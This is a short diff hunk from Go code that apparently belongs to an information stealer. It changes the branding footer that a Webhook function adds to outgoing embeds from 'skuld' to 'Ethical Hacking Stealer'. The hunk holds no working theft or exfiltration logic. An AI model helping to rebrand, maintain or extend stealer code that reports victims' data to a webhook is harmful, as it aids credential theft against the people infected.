@@ -177,7 +177,7 @@ func Webhook(webhook string, data map[string]interface{}, files ...string) {
 	if data["embeds"] != nil {
 		for _, embed := range data["embeds"].([]map[string]interface{}) {
 			embed["footer"] = map[string]interface{}{
-				"text":     "skuld - made by hackirby",
+				"text":     "Ethical Hacking Stealer - made by Ethical Hacking",
 				"icon_url": "https://avatars.githubusercontent.com/u/222531077?v=4",
 			}
 			embed["color"] = 0xb143e3
